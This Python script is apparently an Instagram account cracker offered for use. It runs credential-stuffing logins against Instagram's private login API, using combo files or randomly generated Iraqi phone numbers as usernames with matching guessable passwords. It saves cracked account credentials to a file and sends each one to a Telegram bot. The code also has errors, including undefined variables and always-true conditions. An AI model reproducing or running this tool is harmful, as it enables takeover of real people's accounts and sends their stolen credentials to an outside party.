import os
from time import sleep
os.system("title " + " Paris  Was Here - @DARK")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg('3')
color4 = fg('6')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
def banner():
    print("""                             

 ______        _       _______     ___  ____   
|_   _ `.     / \     |_   __ \   |_  ||_  _|  
  | | `. \   / _ \      | |__) |    | |_/ /    
  | |  | |  / ___ \     |  __ /     |  __'.    
 _| |_.' /_/ /   \ \_  _| |  \ \_  _| |  \ \_  
|______.'|____| |____||____| |___||____||____| 
                                               
\n=========================""")
    sleep(0.50)

banner()
print("")
print("\n\033[0;1m[!] \033[35;1mDone Download All Libareis ")
h , b,s,block = 0,0,0,0
tele = input("\033[0;1m[+] \033[35;1mSend Hits To Telegram \033[32;1mY\033[33;1m/\033[31;1mN ?: ")
if "Y" in tele:
    id = input("\033[0;1m[+] \033[36;1mTelegram Id =\033[33;1m ")
    bot = input("\033[0;1m[+] \033[34;1mBot Token =\033[33;1m ")
elif "y" in tele:
    id = input("\033[0;1m[+] \033[36;1mTelegram Id =\033[33;1m ")
    bot = input("\033[0;1m[+] \033[37;1mBot Token =\033[33;1m ")
    print("")
    print("=========================")
 
print("")
ask = input("""\033[0;1 HAMA GYAN HAL BZHERA 
\033[0;1m \033[0;1m[1] \033[36;1m By Combo         \033[0;1m    
\033[0;1m\033[0;1m[3]\033[34;1m  Auto Num:Num     \033[0;1m    
\033[0;1m
==========================
[+] Please Select Mode : \033[96;1m""")
if ask == "3":
   
    make = '0123456789'
    clear()
    banner()
    print("")
    print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
    print("HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")

    while True:
        us = str(''.join((random.choice(make) for i in range(8))))
        user = '+964750' + us
        pasw = '0750' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
               t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
            print("HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')

#==================================================================
elif ask =="1":
    assk = input("[+] Enter File Name : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
            	t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=HAMA INSTA GOOD\n====================\n EMAIL : {user} \n PASS: {pasw}\n BY : @HAMAYAXIM1\n====================\n CH : pubgmobilefree23")
         
            open("Hited Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')

    